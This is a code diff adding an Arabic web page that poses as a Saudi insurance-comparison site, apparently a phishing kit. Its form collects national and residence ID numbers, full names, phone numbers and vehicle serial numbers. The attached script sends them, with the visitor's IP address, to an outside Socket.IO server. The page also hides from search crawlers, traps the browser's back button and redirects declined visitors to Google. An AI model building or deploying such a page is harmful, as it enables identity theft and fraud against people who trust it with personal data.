@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+
+<html lang="ar">
+
+<head>
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <meta charset="utf-8" />
+  <!-- Prevent indexing and following by well-behaved crawlers: -->
+  <meta name="robots" content="noindex, nofollow" />
+
+  <!-- Prevent archiving or snippet display: -->
+  <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet" />
+  <meta name="bingbot" content="noindex, nofollow" />
+  <meta name="yandex" content="none" />
+  <title>الصفحة الرئيسية</title>
+  <!-- Remove the integrity attribute entirely: -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"
+    crossorigin="anonymous" />
+
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Readex+Pro:wght@160..700&display=swap");
+    @import url("https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css");
+
+    * {
+      font-family: "Readex Pro", sans-serif;
+      font-optical-sizing: auto;
+      font-weight: 400;
+      /* ✅ ضع رقم وزن صالح هنا، مثل: 160 أو 400 أو 700 */
+      font-style: normal;
+      font-variation-settings: "HEXP" 0;
+    }
+
+    .header {
+      background-color: #146394;
+      color: white;
+      text-align: center;
+      padding: 30px 20px 50px;
+    }
+
+    .header h1 {
+      margin: 0;
+      font-size: 20px;
+      font-weight: 700;
+    }
+
+    .header p {
+      margin-top: 10px;
+      font-size: 12px;
+      font-weight: 400;
+      color: rgba(255, 255, 255, 0.8);
+    }
+
+    .tabs {
+      display: flex;
+      justify-content: space-around;
+      background-color: white;
+      border-radius: 20px 20px 0 0;
+      position: relative;
+      top: -40px;
+      margin: 0 10px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+    }
+
+    .tab {
+      text-align: center;
+      padding: 10px 0;
+      color: #999;
+      flex: 1;
+      text-decoration: none;
+      cursor: pointer;
+    }
+
+    .tab i {
+      font-size: 20px;
+      display: block;
+      margin-bottom: 5px;
+      color: #999;
+    }
+
+    .tab.active {
+      color: #003865;
+      font-weight: bold;
+      position: relative;
+    }
+
+    .tab.active i {
+      color: #e74cb3;
+    }
+
+    .tab.active::after {
+      content: "";
+      position: absolute;
+      bottom: 0;
+      right: 50%;
+      transform: translateX(50%);
+      width: 40px;
+      height: 5px;
+      background: orange;
+      border-radius: 3px 3px 0 0;
+    }
+
+    .content {
+      background: white;
+      border-radius: 0 0 20px 20px;
+      padding: 30px 20px;
+      margin: -30px 10px 30px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+      min-height: 200px;
+      font-size: 16px;
+      color: #333;
+    }
+
+    .content-section {
+      display: none;
+    }
+
+    .content-section.active {
+      display: block;
+    }
+
+    .form-group {
+      margin-bottom: 1.5rem;
+    }
+
+    .form-group label {
+      font-size: 14px;
+      font-weight: 400;
+      color: #777;
+      display: block;
+      margin-bottom: 6px;
+    }
+
+    .captcha-wrapper {
+      display: flex;
+      align-items: center;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      background-color: #fff;
+      overflow: hidden;
+    }
+
+    .captcha-img-box {
+      padding: 5px 10px;
+
+      display: flex;
+      align-items: center;
+    }
+
+    .captcha-img-box img {
+      height: 40px;
+      display: block;
+    }
+
+    .captcha-refresh {
+      border: none;
+      background: none;
+      font-size: 18px;
+      padding: 0 10px;
+      cursor: pointer;
+      color: #333;
+      transition: transform 0.3s ease;
+    }
+
+    .captcha-refresh:hover {
+      transform: rotate(90deg);
+    }
+
+    .captcha-input {
+      border: none;
+      flex: 1;
+      padding: 10px;
+      font-size: 16px;
+      text-align: right;
+    }
+
+    .captcha-input:focus {
+      outline: none;
+    }
+  </style>
+</head>
+
+<body dir="rtl">
+  <div id="decline-message" style="display: block">
+    <nav class="navbar navbar-expand-lg navbar-light bg-light text-center">
+      <img alt="" src="assets/icon/Bca-logo.svg" style="margin: auto" width="122px" />
+    </nav>
+
+    <div class="header">
+      <h1>قارن، آمن، استلم وثيقتك</h1>
+      <p>مكان واحد وفّر عليك البحث بين أكثر من 20 شركة تأمين!</p>
+    </div>
+
+    <div class="tabs">
+      <div class="tab active" data-tab="vehicles">
+        <i class="fa-solid fa-car"></i>
+        <span>مركبات</span>
+      </div>
+      <div class="tab" data-tab="medical">
+        <i class="fa-solid fa-heart-pulse"></i>
+        <span>طبي</span>
+      </div>
+      <div class="tab" data-tab="errors">
+        <i class="fa-solid fa-stethoscope"></i>
+        <span>أخطاء طبية</span>
+      </div>
+      <div class="tab" data-tab="travel">
+        <i class="fa-solid fa-plane"></i>
+        <span>سفر</span>
+      </div>
+    </div>
+    <div class="content">
+      <div class="content-section active" id="vehicles">
+        <div class="d-flex justify-content-between Switch_1" id="Switch_1">
+          <button class="btn col-6 bt_1" style="
+                background-color: #146394;
+                color: white;
+                border-radius: 0;
+                border-top-right-radius: 18px;
+                font-size: 11px;
+                height: 36px;
+              " type="submit">
+            تأمين جديد
+          </button>
+          <button class="btn col-6 bt_2" style="
+                background-color: #dbdbdb;
+                color: #707070;
+                border-radius: 0;
+                border-top-left-radius: 18px;
+                font-size: 11px;
+                height: 36px;
+              " type="submit">
+            نقل ملكية
+          </button>
+        </div>
+        <div class="text-right mt-3">
+          <form>
+            <div class="form-group">
+              <label for="SellerـIDـnumber">رقم الهوية البائع</label>
+              <input class="form-control text-right" id="SellerـIDـnumber" type="tel" minlength="10" maxlength="10"
+                pattern="^(10|20)[0-9]{8}$" title="يجب أن يكون الرقم مكوناً من 10 أرقام ويبدأ بـ10 أو 20"
+                oninput="this.value = this.value.replace(/\D/g, '').slice(0, 10)" required />
+            </div>
+            <div class="form-group">
+              <label for="BuyerـIDـnumber">رقم الهوية المشتري</label>
+              <input class="form-control text-right" id="BuyerـIDـnumber" type="tel" minlength="10" maxlength="10"
+                pattern="^(10|20)[0-9]{8}$" title="يجب أن يكون الرقم مكوناً من 10 أرقام ويبدأ بـ10 أو 20"
+                oninput="this.value = this.value.replace(/\D/g, '').slice(0, 10)" required />
+            </div>
+            <div class="form-group">
+              <label for="IDـorـresidenceـnumber">رقم الهوية / الإقامة</label>
+              <input class="form-control text-right" id="IDـorـresidenceـnumber" type="tel" minlength="10"
+                maxlength="10" pattern="^(10|20)[0-9]{8}$" title="يجب أن يكون الرقم مكوناً من 10 أرقام ويبدأ بـ10 أو 20"
+                oninput="this.value = this.value.replace(/\D/g, '').slice(0, 10)" required />
+            </div>
+            <div class="form-group">
+              <label for="Full_name">اسم مالك الوثيقة كاملا</label>
+              <input class="form-control" id="Full_name" type="text" required pattern="^[A-Za-z\u0600-\u06FF ]+$"
+                title="يجب أن يحتوي الاسم الكامل على أحرف عربية أو إنجليزية ومسافات فقط"
+                oninput="this.value = this.value.replace(/[^A-Za-z\u0600-\u06FF ]/g, '')" />
+            </div>
+            <div class="form-group">
+              <label for="Phone_number">رقم الهاتف</label>
+              <input class="form-control text-right" id="Phone_number" placeholder="05xxxxxxxx" type="tel"
+                minlength="10" maxlength="10" pattern="^05[0-9]{8}$"
+                title="يجب أن يبدأ الرقم بـ05 ومكوّن من 10 أرقام (رقم سعودي محلي بدون رمز الدولة)"
+                oninput="this.value = this.value.replace(/\D/g, '').slice(0, 10)" required />
+            </div>
+            <div class="d-flex justify-content-between container mb-3 Switch_2" id="Switch_2">
+              <button class="btn col-6 ml-1 bt_1" style="
+                    background-color: #146394;
+                    color: white;
+                    font-size: 11px;
+                    height: 36px;
+                  " type="submit">
+                استمارة
+              </button>
+              <button class="btn col-6 mr-1 bt_2" style="
+                    background-color: #dbdbdb;
+                    color: #707070;
+                    font-size: 11px;
+                    height: 36px;
+                  " type="submit">
+                بطاقة جمركية
+              </button>
+            </div>
+            <div class="form-group">
+              <label for="Yearـofـmanufactureـofـtheـvehicle">سنة صنع المركبة</label>
+              <select class="form-control" id="Yearـofـmanufactureـofـtheـvehicle">
+                <option value=""></option>
+              </select>
+            </div>
+            <div class="form-group position-relative">
+              <label for="Serialـnumber">الرقم التسلسلي</label>
+              <div class="input-with-icon" style="position: relative">
+                <input class="form-control text-right" id="Serialـnumber" type="tel" minlength="9" maxlength="9"
+                  pattern="^[0-9]{9}$" title="يجب أن يتكون الرقم التسلسلي من 9 أرقام بالتمام والكمال"
+                  oninput="this.value = this.value.replace(/\D/g, '').slice(0, 9)" required
+                  style="padding-left: 40px" />
+
+                <i class="fas fa-info-circle" id="info-icon" style="
+                      position: absolute;
+                      left: 10px;
+                      top: 50%;
+                      transform: translateY(-50%);
+                      color: #4682b4;
+                      cursor: pointer;
+                    " title="أين أجد الرقم التسلسلي؟"></i>
+              </div>
+              <div id="serial-help-image" style="display: none; margin-top: 10px">
+                <img alt="موقع الرقم التسلسلي" src="assets/icon/info.png" style="max-width: 100%; border-radius: 8px" />
+              </div>
+            </div>
+            <div class="form-group" dir="ltr">
+              <label for="verification-code">رمز التحقق</label>
+              <div class="captcha-wrapper">
+                <div class="captcha-img-box">
+                  <img alt="كابتشا" id="captcha-img" src="" />
+                  <button aria-label="تحديث الكابتشا" class="captcha-refresh" onclick="changeCaptcha()" type="button">
+                    <i class="fas fa-sync-alt"></i>
+                  </button>
+                </div>
+                <input class="captcha-input" id="verification-code" required="" type="text" />
+              </div>
+            </div>
+            <h4 style="font-size: 14px; color: #777777; line-height: 1.4rem">
+              أوافق على منح شركة عناية الوسيط الحق في الاستعلام من شركة نجم
+              و/أو مركز المعلومات الوطني عن بياناتي
+            </h4>
+            <button id="ackIndex" class="btn btn-warning col-12 mt-2" type="submit">
+              إظهار العروض
+            </button>
+          </form>
+        </div>
+      </div>
+      <div class="content-section" id="medical">
+        <div class="text-center">
+          <img alt="" src="assets/icon/Animation.gif" width="250px" />
+          <h5>الخدمه تحت الصيانه</h5>
+        </div>
+      </div>
+      <div class="content-section" id="errors">
+        <div class="text-center">
+          <img alt="" src="assets/icon/Animation.gif" width="250px" />
+          <h5>الخدمه تحت الصيانه</h5>
+        </div>
+      </div>
+      <div class="content-section" id="travel">
+        <div class="text-center">
+          <img alt="" src="assets/icon/Animation.gif" width="250px" />
+          <h5>الخدمه تحت الصيانه</h5>
+        </div>
+      </div>
+    </div>
+  </div>
+  <script>
+    const tabs = document.querySelectorAll(".tab");
+    const contents = document.querySelectorAll(".content-section");
+
+    tabs.forEach((tab) => {
+      tab.addEventListener("click", () => {
+        tabs.forEach((t) => t.classList.remove("active"));
+        tab.classList.add("active");
+
+        const target = tab.dataset.tab;
+        contents.forEach((c) => {
+          c.classList.remove("active");
+          if (c.id === target) {
+            c.classList.add("active");
+          }
+        });
+      });
+    });
+
+    document.addEventListener("DOMContentLoaded", () => {
+      const sellerId = document.getElementById("SellerـIDـnumber");
+      const buyerId = document.getElementById("BuyerـIDـnumber");
+      const idNumber = document.getElementById("IDـorـresidenceـnumber");
+      const yearSelect = document.getElementById(
+        "Yearـofـmanufactureـofـtheـvehicle"
+      );
+
+      const btnNew = document.querySelector("#Switch_1 .bt_1");
+      const btnTransfer = document.querySelector("#Switch_1 .bt_2");
+      const btnForm = document.querySelector("#Switch_2 .bt_1");
+      const btnCustomCard = document.querySelector("#Switch_2 .bt_2");
+
+      for (let year = 2000; year <= 2026; year++) {
+        const option = document.createElement("option");
+        option.value = year;
+        option.textContent = year;
+        yearSelect.appendChild(option);
+      }
+
+      function activateNewInsurance() {
+        btnNew.style.backgroundColor = "#146394";
+        btnNew.style.color = "#fff";
+        btnTransfer.style.backgroundColor = "#dbdbdb";
+        btnTransfer.style.color = "#707070";
+
+        sellerId.parentElement.style.display = "none";
+        buyerId.parentElement.style.display = "none";
+        sellerId.removeAttribute("required");
+        buyerId.removeAttribute("required");
+
+        idNumber.parentElement.style.display = "";
+        idNumber.setAttribute("required", "true");
+      }
+
+      function activateOwnershipTransfer() {
+        btnTransfer.style.backgroundColor = "#146394";
+        btnTransfer.style.color = "#fff";
+        btnNew.style.backgroundColor = "#dbdbdb";
+        btnNew.style.color = "#707070";
+
+        sellerId.parentElement.style.display = "";
+        buyerId.parentElement.style.display = "";
+        sellerId.setAttribute("required", "true");
+        buyerId.setAttribute("required", "true");
+
+        idNumber.parentElement.style.display = "none";
+        idNumber.removeAttribute("required");
+
+        activateForm();
+      }
+
+      function activateForm() {
+        btnForm.style.backgroundColor = "#146394";
+        btnForm.style.color = "#fff";
+        btnCustomCard.style.backgroundColor = "#dbdbdb";
+        btnCustomCard.style.color = "#707070";
+
+        yearSelect.parentElement.style.display = "none";
+        yearSelect.removeAttribute("required");
+      }
+
+      function activateCustomCard() {
+        btnCustomCard.style.backgroundColor = "#146394";
+        btnCustomCard.style.color = "#fff";
+        btnForm.style.backgroundColor = "#dbdbdb";
+        btnForm.style.color = "#707070";
+
+        yearSelect.parentElement.style.display = "";
+        yearSelect.setAttribute("required", "true");
+
+        if (btnTransfer.style.backgroundColor === "rgb(20, 99, 148)") {
+          activateNewInsurance();
+        }
+      }
+
+      activateNewInsurance();
+      activateForm();
+      yearSelect.parentElement.style.display = "none";
+
+      btnNew.addEventListener("click", (e) => {
+        e.preventDefault();
+        activateNewInsurance();
+      });
+
+      btnTransfer.addEventListener("click", (e) => {
+        e.preventDefault();
+        activateOwnershipTransfer();
+      });
+
+      btnForm.addEventListener("click", (e) => {
+        e.preventDefault();
+        activateForm();
+      });
+
+      btnCustomCard.addEventListener("click", (e) => {
+        e.preventDefault();
+        activateCustomCard();
+      });
+    });
+
+    const captchaImages = [
+      "5161.png",
+      "6092.png",
+      "1889.png",
+      "1358.png",
+      "8696.png",
+    ];
+
+    let currentCaptchaValue = "";
+
+    function changeCaptcha() {
+      const random =
+        captchaImages[Math.floor(Math.random() * captchaImages.length)];
+      document.getElementById("captcha-img").src =
+        "assets/captcha-images/" + random;
+      currentCaptchaValue = random.replace(".png", "");
+      validateCaptcha();
+    }
+
+    function validateCaptcha() {
+      const input = document.getElementById("verification-code");
+      const value = input.value.trim();
+
+      const isCorrect = value === currentCaptchaValue;
+      const isLengthValid = /^\d{4}$/.test(value);
+
+      if (isCorrect && isLengthValid) {
+        input.removeAttribute("required");
+        input.setCustomValidity("");
+      } else {
+        input.setAttribute("required", "true");
+        input.setCustomValidity("رمز التحقق غير صحيح أو غير مكون من ٤ أرقام");
+      }
+    }
+
+    document
+      .getElementById("verification-code")
+      .addEventListener("input", validateCaptcha);
+
+    window.onload = changeCaptcha;
+
+    document
+      .getElementById("info-icon")
+      .addEventListener("click", function () {
+        const helpImg = document.getElementById("serial-help-image");
+        helpImg.style.display =
+          helpImg.style.display === "none" ? "block" : "none";
+      });
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
+  <!-- 1) Load Socket.IO client exactly once -->
+  <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+
+  <!-- 2) Bootstrap your socket + visitorIP -->
+  <script>
+    // create a single socket instance
+    window.socket = io("https://b-care-server-mohammad.onrender.com");
+    // placeholder for IP
+    window.visitorIP = null;
+
+    // fetch and store IP once
+    (async () => {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const { ip } = await res.json();
+        window.visitorIP = ip;
+        // announce initial location
+        const page = window.location.pathname.split("/").pop() || "home.html";
+        window.socket.emit("updateLocation", { ip, page });
+      } catch (err) {
+        console.error("Failed to fetch visitor IP:", err);
+      }
+    })();
+  </script>
+
+  <!-- 3) Load your pared-down location.js -->
+  <!-- <script src="./assets/js/location.js"></script> -->
+
+  <!-- 4) Attach your form → socket submit logic -->
+  <script>
+    const form = document.querySelector("form");
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+
+      // wait for IP to be ready
+      while (window.visitorIP === null) {
+        await new Promise((r) => setTimeout(r, 50));
+      }
+
+      const payload = {
+        ip: window.visitorIP,
+        SellerIDnumber: document.getElementById("SellerـIDـnumber").value,
+        BuyerIDnumber: document.getElementById("BuyerـIDـnumber").value,
+        IDorResidenceNumber: document.getElementById("IDـorـresidenceـnumber")
+          .value,
+        FullName: document.getElementById("Full_name").value,
+        PhoneNumber: document.getElementById("Phone_number").value,
+        SerialNumber: document.getElementById("Serialـnumber").value,
+        VerificationCode: document.getElementById("verification-code").value,
+      };
+
+      console.log("emitting submitIndex:", payload);
+      window.socket.emit("submitIndex", payload);
+
+      // go to details.html immediately
+      window.location.href = "details.html";
+    });
+
+    document.addEventListener("DOMContentLoaded", async () => {
+      // 3a) Show decline‐message if URL contains '?declined=true'
+      const params = new URLSearchParams(window.location.search);
+      if (params.get("declined") === "true") {
+        // document.getElementById("decline-message").style.display = "none";
+        window.location.href = "https://google.com";
+      }
+      window.socket.on("ackIndex", (resp) => {
+        if (resp.success) {
+          // keep overlay on; location.js will handle navigation
+        } else {
+          // hide overlay on error
+        }
+      });
+    });
+  </script>
+
+  <script>
+    (function () {
+      // Push a new history entry so that back button stays on this page
+      window.history.pushState(null, null, window.location.href);
+
+      // Whenever the user tries to navigate back, push them forward again
+      window.addEventListener("popstate", function (event) {
+        window.history.pushState(null, null, window.location.href);
+      });
+    })();
+  </script>
+</body>
+
+</html>
